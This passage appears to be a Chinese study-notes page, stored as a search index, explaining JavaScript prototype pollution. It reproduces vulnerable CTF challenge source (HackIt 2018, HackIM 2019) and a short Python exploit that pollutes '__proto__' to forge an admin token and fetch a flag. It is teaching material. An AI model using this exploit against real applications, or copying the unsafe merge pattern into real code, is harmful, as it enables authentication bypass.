\u5728Javascript\u4e2d\u53ef\u4ee5\u901a\u8fc7example.a.b\u6216example.a[\"b\"]\u6765\u5bf9\u6570\u7ec4\u8fdb\u884c\u8bbf\u95ee,example.a\u8bbf\u95ee\u7684\u662fexample\u5bf9\u8c61\u4e0b\u7684a\u5bf9\u8c61\u7684b,\u800cexample.a[\"b\"]\u5219\u662f\u8bbf\u95eeexample\u5bf9\u8c61\u4e0b\u7684a\u6570\u7ec4\u7684\u4e0b\u6807\u4e3ab\u7684\u503c\u3002 \u7531\u4e8e\u5bf9\u8c61\u662f\u65e0\u5e8f\u7684,\u5f53\u4f7f\u7528\u7b2c\u4e8c\u79cd\u65b9\u5f0f\u8bbf\u95ee\u5bf9\u8c61\u65f6,\u53ea\u80fd\u4f7f\u7528\u6307\u660e\u4e0b\u6807\u7684\u65b9\u5f0f\u53bb\u8bbf\u95ee\u3002 \u56e0\u6b64\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7a[\" proto \"]\u7684\u65b9\u5f0f\u53bb\u8bbf\u95ee\u5176\u539f\u578b\u5bf9\u8c61\u3002 \u5b9e\u4f8b \u00b6 Hackit 2018 \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 const express = require ( 'express' ) var hbs = require ( 'hbs' ); var bodyParser = require ( 'body-parser' ); const md5 = require ( 'md5' ); var morganBody = require ( 'morgan-body' ); const app = express (); var user = []; //empty for now var matrix = []; for ( var i = 0 ; i < 3 ; i ++ ){ matrix [ i ] = [ null , null , null ]; } function draw ( mat ) { var count = 0 ; for ( var i = 0 ; i < 3 ; i ++ ){ for ( var j = 0 ; j < 3 ; j ++ ){ if ( matrix [ i ][ j ] !== null ){ count += 1 ; } } } return count === 9 ; } app . use ( '/static' , express . static ( 'static' )); app . use ( bodyParser . json ()); app . set ( 'view engine' , 'html' ); morganBody ( app ); app . engine ( 'html' , require ( 'hbs' ). __express ); app . get ( '/' , ( req , res ) => { for ( var i = 0 ; i < 3 ; i ++ ){ matrix [ i ] = [ null , null , null ]; } res . render ( 'index' ); }) app . get ( '/admin' , ( req , res ) => { /*this is under development I guess ??*/ if ( user . admintoken && req . query . querytoken && md5 ( user . admintoken ) === req . query . querytoken ){ res . send ( 'Hey admin your flag is <b>flag{prototype_pollution_is_very_dangerous}</b>' ); } else { res . status ( 403 ). send ( 'Forbidden' ); } } ) app . post ( '/api' , ( req , res ) => { var client = req . body ; var winner = null ; if ( client . row > 3 || client . col > 3 ){ client . row %= 3 ; client . col %= 3 ; } matrix [ client . row ][ client . col ] = client . data ; console . log ( matrix ); for ( var i = 0 ; i < 3 ; i ++ ){ if ( matrix [ i ][ 0 ] === matrix [ i ][ 1 ] && matrix [ i ][ 1 ] === matrix [ i ][ 2 ] ){ if ( matrix [ i ][ 0 ] === 'X' ) { winner = 1 ; } else if ( matrix [ i ][ 0 ] === 'O' ) { winner = 2 ; } } if ( matrix [ 0 ][ i ] === matrix [ 1 ][ i ] && matrix [ 1 ][ i ] === matrix [ 2 ][ i ]){ if ( matrix [ 0 ][ i ] === 'X' ) { winner = 1 ; } else if ( matrix [ 0 ][ i ] === 'O' ) { winner = 2 ; } } } if ( matrix [ 0 ][ 0 ] === matrix [ 1 ][ 1 ] && matrix [ 1 ][ 1 ] === matrix [ 2 ][ 2 ] && matrix [ 0 ][ 0 ] === 'X' ){ winner = 1 ; } if ( matrix [ 0 ][ 0 ] === matrix [ 1 ][ 1 ] && matrix [ 1 ][ 1 ] === matrix [ 2 ][ 2 ] && matrix [ 0 ][ 0 ] === 'O' ){ winner = 2 ; } if ( matrix [ 0 ][ 2 ] === matrix [ 1 ][ 1 ] && matrix [ 1 ][ 1 ] === matrix [ 2 ][ 0 ] && matrix [ 2 ][ 0 ] === 'X' ){ winner = 1 ; } if ( matrix [ 0 ][ 2 ] === matrix [ 1 ][ 1 ] && matrix [ 1 ][ 1 ] === matrix [ 2 ][ 0 ] && matrix [ 2 ][ 0 ] === 'O' ){ winner = 2 ; } if ( draw ( matrix ) && winner === null ){ res . send ( JSON . stringify ({ winner : 0 })) } else if ( winner !== null ) { res . send ( JSON . stringify ({ winner : winner })) } else { res . send ( JSON . stringify ({ winner : - 1 })) } }) app . listen ( 3000 , () => { console . log ( 'app listening on port 3000!' ) }) \u6f0f\u6d1e\u5173\u952e\u4f4d\u7f6e 1 2 3 4 5 6 7 8 9 10 app . post ( '/api' , ( req , res ) => { var client = req . body ; var winner = null ; if ( client . row > 3 || client . col > 3 ){ client . row %= 3 ; client . col %= 3 ; } matrix [ client . row ][ client . col ] = client . data ; \u800cdata\u662f\u4ece\u7f51\u9875\u4f20\u9012\u7684\u53c2\u6570,\u5f62\u5982: {\"row\":1,\"col\":\"1\",\"data\":\"X\"} \u5bf9\u5e94\u7684row\u4ee5\u53cacol\u503c\u4f1a\u5b58\u653e\u81f3matrix\u4e2d,\u800c\u8fd9\u91cc\u5219\u4f1a\u5bfc\u81f4\u4e00\u4e2a\u539f\u578b\u94fe\u6c61\u67d3\u7684\u9690\u60a3\u3002 \u56de\u5230\u9898\u76ee\u672c\u8eab\u7684\u903b\u8f91\u4e2d,\u83b7\u5f97Flag\u7684\u8981\u6c42\u4e3a: \u4f20\u5165\u7684querytoken\u4e0euser.admintoken\u7684md5\u54c8\u5e0c\u503c\u4e00\u6837 \u4e00\u4e2a\u7b80\u8981\u7684\u539f\u578b\u94fe\u6c61\u67d3\u5982\u4e0b\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 > a=[]; <\u00b7 [] > b=[]; <\u00b7 [] > b[\"__proto__\"]; <\u00b7 [constructor: \u0192, concat: \u0192, find: \u0192, findIndex: \u0192, pop: \u0192, \u2026] > b[\"__proto__\"][\"admintoken\"]=\"ccda\"; <\u00b7 \"ccda\" > a <\u00b7 [] > a.admintoken <\u00b7 \"ccda\" \u53c2\u8003wp\u5f97\u5230\u4e00\u4e2aexp\u5982\u4e0b\uff1a 1 2 3 4 5 6 import requests r = requests . post ( 'http://185.168.131.1:3000/api' , json = { 'row' : '__proto__' , 'col' : 'admintoken' , 'data' : 'qqq' }) r = requests . get ( 'http://185.168.131.1:3000/admin?querytoken=' + md5sumhex ( 'qqq' )) print r . text \u90a3\u4e48 matrix[__proto__][admintoken]=qqq \u8fd9\u5c31\u8db3\u4ee5\u8fbe\u5230\u76ee\u7684\u4e86 GitHub\u4e0a\u4e00\u4e2a\u7528\u6765\u68c0\u6d4b\u662f\u5426\u5b58\u5728\u539f\u578b\u94fe\u6c61\u67d3\u7684\u9879\u76ee https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/README.md \u6765\u81eap\u725b\u7684\u6587\u7ae0 \u00b6 JavaScript\u4e2d\uff0c\u6211\u4eec\u5982\u679c\u8981\u5b9a\u4e49\u4e00\u4e2a\u7c7b\uff0c\u9700\u8981\u4ee5\u5b9a\u4e49\u201c\u6784\u9020\u51fd\u6570\u201d\u7684\u65b9\u5f0f\u6765\u5b9a\u4e49\uff1a 1 2 3 4 5 function Foo () { this . bar = 1 } new Foo () Foo\u51fd\u6570\u7684\u5185\u5bb9\uff0c\u5c31\u662fFoo\u7c7b\u7684\u6784\u9020\u51fd\u6570\uff0c\u800cthis.bar\u5c31\u662fFoo\u7c7b\u7684\u4e00\u4e2a\u5c5e\u6027\u3002 \u5c1d\u8bd5\u5982\u4e0b\u4ee3\u7801\uff0c foo \u662f object \u7c7b\u7684\u4e00\u4e2a\u5b9e\u4f8b\uff0c\u901a\u8fc7 foo.__proto__ \u4fee\u6539\u4e86 object \u7c7b\u7684\u5c5e\u6027 \u54ea\u4e9b\u60c5\u51b5\u4f1a\u88ab\u6c61\u67d3 \u00b6 \u6211\u4eec\u601d\u8003\u4e00\u4e0b\uff0c\u54ea\u4e9b\u60c5\u51b5\u4e0b\u6211\u4eec\u53ef\u4ee5\u8bbe\u7f6e __proto__ \u7684\u503c\u5462\uff1f\u5176\u5b9e\u627e\u627e\u80fd\u591f\u63a7\u5236\u6570\u7ec4\uff08\u5bf9\u8c61\uff09\u7684\u201c\u952e\u540d\u201d\u7684\u64cd\u4f5c\u5373\u53ef\uff1a \u5bf9\u8c61merge \u5bf9\u8c61clone\uff08\u5176\u5b9e\u5185\u6838\u5c31\u662f\u5c06\u5f85\u64cd\u4f5c\u7684\u5bf9\u8c61merge\u5230\u4e00\u4e2a\u7a7a\u5bf9\u8c61\u4e2d\uff09 \u5b89\u5168\u5ba2\u7684\u6458\u5f55 \u00b6 b \u5728\u5b9e\u4f8b\u5316\u4e3a test\u5bf9\u8c61 \u4ee5\u540e\uff0c\u5c31\u53ef\u4ee5\u8f93\u51fatest\u7c7b\u4e2d\u7684 \u5c5e\u6027a \u4e86 \u5728javascript\u4e2d,\u6bcf\u4e2a\u5bf9\u8c61\u7684\u90fd\u6709\u4e00\u4e2a\u6307\u5411\u4ed6\u7684\u539f\u578b(prototype)\u7684\u5185\u90e8\u94fe\u63a5\uff0c\u8fd9\u4e2a\u539f\u578b\u5bf9\u8c61\u53c8\u6709\u5b83\u81ea\u5df1\u7684\u539f\u578b\uff0c\u76f4\u5230null\u4e3a\u6b62 1 2 3 4 function i (){ this . a = \"test1\" ; this . b = \"test2\" ; } i \u7684\u7236\u7c7b\u4e3aobject\uff0c\u4e14\u91cc\u9762\u8fd8\u6709\u8bb8\u591a\u51fd\u6570\uff0c\u8fd9\u5c31\u89e3\u91ca\u4e86\u4e3a\u4ec0\u4e48\u8bb8\u591a\u53d8\u91cf\u53ef\u4ee5\u8c03\u7528\u67d0\u4e9b\u65b9\u6cd5\u3002 \u5728javascript\u4e2d\u4e00\u5207\u7686\u5bf9\u8c61\uff0c\u56e0\u4e3a\u6240\u6709\u7684\u53d8\u91cf\uff0c\u51fd\u6570\uff0c\u6570\u7ec4\uff0c\u5bf9\u8c61 \u90fd\u59cb\u4e8eobject\u7684\u539f\u578b\u5373object.prototype\u3002\u540c\u65f6\uff0c\u5728js\u4e2d\u53ea\u6709\u7c7b\u624d\u6709prototype\u5c5e\u6027\uff0c\u800c\u5bf9\u8c61\u5374\u6ca1\u6709\uff0c\u5bf9\u8c61\u6709\u7684\u662f __proto__ \u548c\u7c7b\u7684 prototype \u5bf9\u5e94\u3002\u4e14\u4e8c\u8005\u662f\u7b49\u4ef7\u7684 \u521b\u5efa\u4e00\u4e2a\u7c7b\u65f6 \u00b6 \u539f\u578b\u94fe\u4e3a b -> a.prototype -> object.prototype->null \u521b\u5efa\u4e00\u4e2a\u6570\u7ec4\u65f6 \u00b6 c -> array.prototype -> object.prototype->null \u521b\u5efa\u4e00\u4e2a\u51fd\u6570\u65f6 \u00b6 \u539f\u578b\u94fe\u4e3a\uff1a d -> function.prototype -> object.prototype->null \u521b\u5efa\u4e00\u4e2a\u65e5\u671f \u00b6 f -> Data.prototype -> object.prototype->null \u5f97\u51fa\uff1a javascript \u4e00\u5207\u7686\u5bf9\u8c61\uff0c\u4e00\u5207\u7686\u59cb\u4e8e object.prototype \u641c\u7d22\u7684\u8fc7\u7a0b \u00b6 \u5f53\u8981\u4f7f\u7528\u6216\u8f93\u51fa\u4e00\u4e2a\u53d8\u91cf\u65f6\uff1a\u9996\u5148\u4f1a\u5728\u672c\u5c42\u4e2d\u641c\u7d22\u76f8\u5e94\u7684\u53d8\u91cf\uff0c\u5982\u679c\u4e0d\u5b58\u5728\u7684\u8bdd\uff0c\u5c31\u4f1a\u5411\u4e0a\u641c\u7d22\uff0c\u5373\u5728\u81ea\u5df1\u7684\u7236\u7c7b\u4e2d\u641c\u7d22\uff0c\u5f53\u7236\u7c7b\u4e2d\u4e5f\u6ca1\u6709\u65f6\uff0c\u5c31\u4f1a\u5411\u7956\u7236\u7c7b\u641c\u7d22\uff0c\u76f4\u5230\u6307\u5411null\uff0c\u5982\u679c\u6b64\u65f6\u8fd8\u6ca1\u6709\u641c\u7d22\u5230\uff0c\u5c31\u4f1a\u8fd4\u56de undefined j -> i.prototype -> object.prototype -> null \u4e3e\u4f8b \u00b6 mess.js \u6587\u4ef6 1 2 3 4 5 ( function () { var secret = [ \"aaa\" , \"bbb\" ]; secret . forEach (); })(); attach.html \u7ed3\u679c\u5982\u4e0b\uff1a mess.js\u4e2d\u6211\u4eec\u58f0\u660e\u4e86\u4e00\u4e2a\u6570\u7ec4 secret ,\u7136\u540e\u8be5\u6570\u7ec4\u8c03\u7528\u4e86\u5c5e\u4e8e Array.protottype \u7684 foreach \u65b9\u6cd5,\u5982\u4e0b \u5728\u8c03\u7528js\u6587\u4ef6\u4e4b\u524d\uff0cjs\u4ee3\u7801\u4e2d\u5c06 Array.prototype.foreach \u65b9\u6cd5\u8fdb\u884c\u4e86\u91cd\u5199\uff0c\u800cprototype\u94fe\u4e3a secret -> Array.prototype ->object.prototype ,secret\u4e2d\u65e0 foreach \u65b9\u6cd5\uff0c\u6240\u4ee5\u5c31\u4f1a\u5411\u4e0a\u68c0\u7d22\uff0c\u5c31\u627e\u5230\u4e86 Array.prototype \u800c\u5176 foreach \u65b9\u6cd5\u5df2\u7ecf\u88ab\u91cd\u5199\u8fc7\u4e86\uff0c\u6240\u4ee5\u4f1a\u6267\u884c\u8f93\u51fa\u3002 \u8fd9\u5c31\u662f\u539f\u578b\u94fe\u6c61\u67d3\u3002\u5f88\u660e\u663e\uff0c\u539f\u578b\u94fe\u6c61\u67d3\u5c31\u662f\uff1a \u5728\u6211\u4eec\u60f3\u8981\u5229\u7528\u7684\u4ee3\u7801\u4e4b\u524d\u7684\u8d4b\u503c\u8bed\u53e5\u5982\u679c\u53ef\u63a7\u7684\u8bdd\uff0c\u6211\u4eec\u8fdb\u884c \u2014\u2014__proto__ \u8d4b\u503c\uff0c\u4e4b\u540e\u5c31\u53ef\u4ee5\u5229\u7528\u4ee3\u7801\u4e86 \u770b\u4e00\u9053\u9898\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 'use strict' ; const express = require ( 'express' ); const bodyParser = require ( 'body-parser' ) const cookieParser = require ( 'cookie-parser' ); const path = require ( 'path' ); const isObject = obj => obj && obj . constructor && obj . constructor === Object ; function merge ( a , b ) { for ( var attr in b ) { if ( isObject ( a [ attr ]) && isObject ( b [ attr ])) { merge ( a [ attr ], b [ attr ]); } else { a [ attr ] = b [ attr ]; } } return a } function clone ( a ) { return merge ({}, a ); } // Constants const PORT = 8080 ; const HOST = '0.0.0.0' ; const admin = {}; // App const app = express (); app . use ( bodyParser . json ()) app . use ( cookieParser ()); app . use ( '/' , express . static ( path . join ( __dirname , 'views' ))); app . post ( '/signup' , ( req , res ) => { var body = JSON . parse ( JSON . stringify ( req . body )); var copybody = clone ( body ) if ( copybody . name ) { res . cookie ( 'name' , copybody . name ). json ({ \"done\" : \"cookie set\" }); } else { res . json ({ \"error\" : \"cookie not set\" }) } }); app . get ( '/getFlag' , ( req , res ) => { var \u0430dmin = JSON . parse ( JSON . stringify ( req . cookies )) if ( admin . \u0430dmin == 1 ) { res . send ( \"hackim19{}\" ); } else { res . send ( \"You are not authorized\" ); } }); app . listen ( PORT , HOST ); console . log ( `Running on http:// ${ HOST } : ${ PORT } ` ); \u672c\u5730\u6d4b\u8bd5\uff1a \u672a\u6210\u529f \u4eec\u5728\u521b\u5efa\u5b57\u5178\u7684\u65f6\u5019\uff0c __proto__ ,\u4e0d\u662f\u4f5c\u4e3a\u4e00\u4e2a\u952e\u540d\uff0c\u800c\u662f\u5df2\u7ecf\u4f5c\u4e3a __proto__ \u7ed9\u5176\u7236\u7c7b\u8fdb\u884c\u8d4b\u503c\u4e86\uff0c\u6240\u4ee5\u5728 test.__proto__ \u4e2d\u624d\u6709admin\u5c5e\u6027\uff0c\u4f46\u662f\u6211\u4eec\u662f\u60f3\u8ba9 __proto__ \u4f5c\u4e3a\u4e00\u4e2a\u952e\u503c\u7684. \u4f7f\u7528JSON.parse JSON.parse \u4f1a\u628a\u4e00\u4e2ajson\u5b57\u7b26\u4e32 \u8f6c\u5316\u4e3a javascript\u7684object \u53c2\u8003 \u00b6 https://xz.aliyun.com/t/2735 https://github.com/DefConUA/HackIT2018/tree/master/web/Republic_of_Gayming https://www.anquanke.com/post/id/176884 \u6df1\u5165\u7406\u89e3JavaScript prototype\u6c61\u67d3\u653b\u51fb \u7ffb\u8bd1JavaScript\u539f\u578b\u94fe\u6c61\u67d3 decade\u5e08\u5085\u7684\u6587\u7ae0","title":"\u539f\u578b\u94fe\u6c61\u67d3\u653b\u51fb"},{"location":"web_sec/audit/\u539f\u578b\u94fe\u6c61\u67d3/#_1","text":"1 2 3 4 > let obj = {}; <\u00b7 undefined > obj.__proto__; <\u00b7 {constructor: \u0192, __defineGetter__: \u0192, __defineSetter__: \u0192, hasOwnProperty: \u0192, __lookupGetter__: \u0192, \u2026} \u800c\u7ecf\u8fc7\u4e0d\u65ad\u7684\u8c03\u7528,\u6700\u7ec8\u7684\u539f\u578b\u5bf9\u8c61\u4f1a\u8c03\u7528\u5230null,\u8fd9\u5c06\u4f5c\u4e3a\u8be5\u539f\u578b\u94fe\u7684\u6700\u540e\u4e00\u4e2a\u73af\u8282,\u4e0e\u4e4b\u5bf9\u5e94\u7684,\u4f5c\u4e3a\u7ec8\u70b9\u7684null\u81ea\u7136\u4e5f\u662f\u6ca1\u6709\u539f\u578b\u5bf9\u8c61\u7684\u3002\u6bd4\u5982,\u6211\u4eec\u7ee7\u7eed\u5728\u4e0a\u9762\u7684\u4f8b\u5b50\u4e2d\u8c03\u7528\u5176\u539f\u578b\u5bf9\u8c61: obj. proto . proto ; <\u00b7 null \u5728Javascript\u4e2d\u53ef\u4ee5\u901a\u8fc7example.a.b\u6216example.a[\"b\"]\u6765\u5bf9\u6570\u7ec4\u8fdb\u884c\u8bbf\u95ee,example.a\u8bbf\u95ee\u7684\u662fexample\u5bf9\u8c61\u4e0b\u7684a\u5bf9\u8c61\u7684b,\u800cexample.a[\"b\"]\u5219\u662f\u8bbf\u95eeexample\u5bf9\u8c61\u4e0b\u7684a\u6570\u7ec4\u7684\u4e0b\u6807\u4e3ab\u7684\u503c\u3002 \u7531\u4e8e\u5bf9\u8c61\u662f\u65e0\u5e8f\u7684,\u5f53\u4f7f\u7528\u7b2c\u4e8c\u79cd\u65b9\u5f0f\u8bbf\u95ee\u5bf9\u8c61\u65f6,\u53ea\u80fd\u4f7f\u7528\u6307\u660e\u4e0b\u6807\u7684\u65b9\u5f0f\u53bb\u8bbf\u95ee\u3002 \u56e0\u6b64\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7a[\" proto \"]\u7684\u65b9\u5f0f\u53bb\u8bbf\u95ee\u5176\u539f\u578b\u5bf9\u8c61\u3002","title":"\u539f\u578b\u94fe\u6c61\u67d3\u653b\u51fb"},{"location":"web_sec/audit/\u539f\u578b\u94fe\u6c61\u67d3/#_2","text":"","title":"\u5b9e\u4f8b"},{"location":"web_sec/audit/\u539f\u578b\u94fe\u6c61\u67d3/#hackit-2018","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 const express = require ( 'express' ) var hbs = require ( 'hbs' ); var bodyParser = require ( 'body-parser' ); const md5 = require ( 'md5' ); var morganBody = require ( 'morgan-body' ); const app = express (); var user = []; //empty for now var matrix = []; for ( var i = 0 ; i < 3 ; i ++ ){ matrix [ i ] = [ null , null , null ]; } function draw ( mat ) { var count = 0 ; for ( var i = 0 ; i < 3 ; i ++ ){ for ( var j = 0 ; j < 3 ; j ++ ){ if ( matrix [ i ][ j ] !== null ){ count += 1 ; } } } return count === 9 ; } app . use ( '/static' , express . static ( 'static' )); app . use ( bodyParser . json ()); app . set ( 'view engine' , 'html' ); morganBody ( app ); app . engine ( 'html' , require ( 'hbs' ). __express ); app . get ( '/' , ( req , res ) => { for ( var i = 0 ; i < 3 ; i ++ ){ matrix [ i ] = [ null , null , null ]; } res . render ( 'index' ); }) app . get ( '/admin' , ( req , res ) => { /*this is under development I guess ??*/ if ( user . admintoken && req . query . querytoken && md5 ( user . admintoken ) === req . query . querytoken ){ res . send ( 'Hey admin your flag is <b>flag{prototype_pollution_is_very_dangerous}</b>' ); } else { res . status ( 403 ). send ( 'Forbidden' ); } } ) app . post ( '/api' , ( req , res ) => { var client = req . body ; var winner = null ; if ( client . row > 3 || client . col > 3 ){ client . row %= 3 ; client . col %= 3 ; } matrix [ client . row ][ client . col ] = client . data ; console . log ( matrix ); for ( var i = 0 ; i < 3 ; i ++ ){ if ( matrix [ i ][ 0 ] === matrix [ i ][ 1 ] && matrix [ i ][ 1 ] === matrix [ i ][ 2 ] ){ if ( matrix [ i ][ 0 ] === 'X' ) { winner = 1 ; } else if ( matrix [ i ][ 0 ] === 'O' ) { winner = 2 ; } } if ( matrix [ 0 ][ i ] === matrix [ 1 ][ i ] && matrix [ 1 ][ i ] === matrix [ 2 ][ i ]){ if ( matrix [ 0 ][ i ] === 'X' ) { winner = 1 ; } else if ( matrix [ 0 ][ i ] === 'O' ) { winner = 2 ; } } } if ( matrix [ 0 ][ 0 ] === matrix [ 1 ][ 1 ] && matrix [ 1 ][ 1 ] === matrix [ 2 ][ 2 ] && matrix [ 0 ][ 0 ] === 'X' ){ winner = 1 ; } if ( matrix [ 0 ][ 0 ] === matrix [ 1 ][ 1 ] && matrix [ 1 ][ 1 ] === matrix [ 2 ][ 2 ] && matrix [ 0 ][ 0 ] === 'O' ){ winner = 2 ; } if ( matrix [ 0 ][ 2 ] === matrix [ 1 ][ 1 ] && matrix [ 1 ][ 1 ] === matrix [ 2 ][ 0 ] && matrix [ 2 ][ 0 ] === 'X' ){ winner = 1 ; } if ( matrix [ 0 ][ 2 ] === matrix [ 1 ][ 1 ] && matrix [ 1 ][ 1 ] === matrix [ 2 ][ 0 ] && matrix [ 2 ][ 0 ] === 'O' ){ winner = 2 ; } if ( draw ( matrix ) && winner === null ){ res . send ( JSON . stringify ({ winner : 0 })) } else if ( winner !== null ) { res . send ( JSON . stringify ({ winner : winner })) } else { res . send ( JSON . stringify ({ winner : - 1 })) } }) app . listen ( 3000 , () => { console . log ( 'app listening on port 3000!' ) }) \u6f0f\u6d1e\u5173\u952e\u4f4d\u7f6e 1 2 3 4 5 6 7 8 9 10 app . post ( '/api' , ( req , res ) => { var client = req . body ; var winner = null ; if ( client . row > 3 || client . col > 3 ){ client . row %= 3 ; client . col %= 3 ; } matrix [ client . row ][ client . col ] = client . data ; \u800cdata\u662f\u4ece\u7f51\u9875\u4f20\u9012\u7684\u53c2\u6570,\u5f62\u5982: {\"row\":1,\"col\":\"1\",\"data\":\"X\"} \u5bf9\u5e94\u7684row\u4ee5\u53cacol\u503c\u4f1a\u5b58\u653e\u81f3matrix\u4e2d,\u800c\u8fd9\u91cc\u5219\u4f1a\u5bfc\u81f4\u4e00\u4e2a\u539f\u578b\u94fe\u6c61\u67d3\u7684\u9690\u60a3\u3002 \u56de\u5230\u9898\u76ee\u672c\u8eab\u7684\u903b\u8f91\u4e2d,\u83b7\u5f97Flag\u7684\u8981\u6c42\u4e3a: \u4f20\u5165\u7684querytoken\u4e0euser.admintoken\u7684md5\u54c8\u5e0c\u503c\u4e00\u6837 \u4e00\u4e2a\u7b80\u8981\u7684\u539f\u578b\u94fe\u6c61\u67d3\u5982\u4e0b\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 > a=[]; <\u00b7 [] > b=[]; <\u00b7 [] > b[\"__proto__\"]; <\u00b7 [constructor: \u0192, concat: \u0192, find: \u0192, findIndex: \u0192, pop: \u0192, \u2026] > b[\"__proto__\"][\"admintoken\"]=\"ccda\"; <\u00b7 \"ccda\" > a <\u00b7 [] > a.admintoken <\u00b7 \"ccda\" \u53c2\u8003wp\u5f97\u5230\u4e00\u4e2aexp\u5982\u4e0b\uff1a 1 2 3 4 5 6 import requests r = requests . post ( 'http://185.168.131.1:3000/api' , json = { 'row' : '__proto__' , 'col' : 'admintoken' , 'data' : 'qqq' }) r = requests . get ( 'http://185.168.131.1:3000/admin?querytoken=' + md5sumhex ( 'qqq' )) print r . text \u90a3\u4e48 matrix[__proto__][admintoken]=qqq \u8fd9\u5c31\u8db3\u4ee5\u8fbe\u5230\u76ee\u7684\u4e86 GitHub\u4e0a\u4e00\u4e2a\u7528\u6765\u68c0\u6d4b\u662f\u5426\u5b58\u5728\u539f\u578b\u94fe\u6c61\u67d3\u7684\u9879\u76ee https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/README.md","title":"Hackit 2018"},{"location":"web_sec/audit/\u539f\u578b\u94fe\u6c61\u67d3/#p","text":"JavaScript\u4e2d\uff0c\u6211\u4eec\u5982\u679c\u8981\u5b9a\u4e49\u4e00\u4e2a\u7c7b\uff0c\u9700\u8981\u4ee5\u5b9a\u4e49\u201c\u6784\u9020\u51fd\u6570\u201d\u7684\u65b9\u5f0f\u6765\u5b9a\u4e49\uff1a 1 2 3 4 5 function Foo () { this . bar = 1 } new Foo () Foo\u51fd\u6570\u7684\u5185\u5bb9\uff0c\u5c31\u662fFoo\u7c7b\u7684\u6784\u9020\u51fd\u6570\uff0c\u800cthis.bar\u5c31\u662fFoo\u7c7b\u7684\u4e00\u4e2a\u5c5e\u6027\u3002 \u5c1d\u8bd5\u5982\u4e0b\u4ee3\u7801\uff0c foo \u662f object \u7c7b\u7684\u4e00\u4e2a\u5b9e\u4f8b\uff0c\u901a\u8fc7 foo.__proto__ \u4fee\u6539\u4e86 object \u7c7b\u7684\u5c5e\u6027","title":"\u6765\u81eap\u725b\u7684\u6587\u7ae0"},{"location":"web_sec/audit/\u539f\u578b\u94fe\u6c61\u67d3/#_3","text":"\u6211\u4eec\u601d\u8003\u4e00\u4e0b\uff0c\u54ea\u4e9b\u60c5\u51b5\u4e0b\u6211\u4eec\u53ef\u4ee5\u8bbe\u7f6e __proto__ \u7684\u503c\u5462\uff1f\u5176\u5b9e\u627e\u627e\u80fd\u591f\u63a7\u5236\u6570\u7ec4\uff08\u5bf9\u8c61\uff09\u7684\u201c\u952e\u540d\u201d\u7684\u64cd\u4f5c\u5373\u53ef\uff1a \u5bf9\u8c61merge \u5bf9\u8c61clone\uff08\u5176\u5b9e\u5185\u6838\u5c31\u662f\u5c06\u5f85\u64cd\u4f5c\u7684\u5bf9\u8c61merge\u5230\u4e00\u4e2a\u7a7a\u5bf9\u8c61\u4e2d\uff09","title":"\u54ea\u4e9b\u60c5\u51b5\u4f1a\u88ab\u6c61\u67d3"},{"location":"web_sec/audit/\u539f\u578b\u94fe\u6c61\u67d3/#_4","text":"b \u5728\u5b9e\u4f8b\u5316\u4e3a test\u5bf9\u8c61 \u4ee5\u540e\uff0c\u5c31\u53ef\u4ee5\u8f93\u51fatest\u7c7b\u4e2d\u7684 \u5c5e\u6027a \u4e86 \u5728javascript\u4e2d,\u6bcf\u4e2a\u5bf9\u8c61\u7684\u90fd\u6709\u4e00\u4e2a\u6307\u5411\u4ed6\u7684\u539f\u578b(prototype)\u7684\u5185\u90e8\u94fe\u63a5\uff0c\u8fd9\u4e2a\u539f\u578b\u5bf9\u8c61\u53c8\u6709\u5b83\u81ea\u5df1\u7684\u539f\u578b\uff0c\u76f4\u5230null\u4e3a\u6b62 1 2 3 4 function i (){ this . a = \"test1\" ; this . b = \"test2\" ; } i \u7684\u7236\u7c7b\u4e3aobject\uff0c\u4e14\u91cc\u9762\u8fd8\u6709\u8bb8\u591a\u51fd\u6570\uff0c\u8fd9\u5c31\u89e3\u91ca\u4e86\u4e3a\u4ec0\u4e48\u8bb8\u591a\u53d8\u91cf\u53ef\u4ee5\u8c03\u7528\u67d0\u4e9b\u65b9\u6cd5\u3002 \u5728javascript\u4e2d\u4e00\u5207\u7686\u5bf9\u8c61\uff0c\u56e0\u4e3a\u6240\u6709\u7684\u53d8\u91cf\uff0c\u51fd\u6570\uff0c\u6570\u7ec4\uff0c\u5bf9\u8c61 \u90fd\u59cb\u4e8eobject\u7684\u539f\u578b\u5373object.prototype\u3002\u540c\u65f6\uff0c\u5728js\u4e2d\u53ea\u6709\u7c7b\u624d\u6709prototype\u5c5e\u6027\uff0c\u800c\u5bf9\u8c61\u5374\u6ca1\u6709\uff0c\u5bf9\u8c61\u6709\u7684\u662f __proto__ \u548c\u7c7b\u7684 prototype \u5bf9\u5e94\u3002\u4e14\u4e8c\u8005\u662f\u7b49\u4ef7\u7684","title":"\u5b89\u5168\u5ba2\u7684\u6458\u5f55"},{"location":"web_sec/audit/\u539f\u578b\u94fe\u6c61\u67d3/#_5","text":"\u539f\u578b\u94fe\u4e3a b -> a.prototype -> object.prototype->null","title":"\u521b\u5efa\u4e00\u4e2a\u7c7b\u65f6"},{"location":"web_sec/audit/\u539f\u578b\u94fe\u6c61\u67d3/#_6","text":"c -> array.prototype -> 